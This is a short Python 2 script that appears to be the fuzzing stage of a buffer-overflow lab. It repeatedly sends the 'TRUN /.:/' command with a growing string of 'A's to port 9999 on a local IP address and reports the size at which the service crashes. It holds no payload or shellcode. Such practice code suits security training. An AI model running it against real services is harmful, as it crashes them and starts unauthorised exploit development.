#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100
port = 9999
targetip = '192.168.1.136'

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((targetip, port))
		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100

	except:
		print "Fuzzing crashed at %s bytes" %str(len(buffer))
		sys.exit()


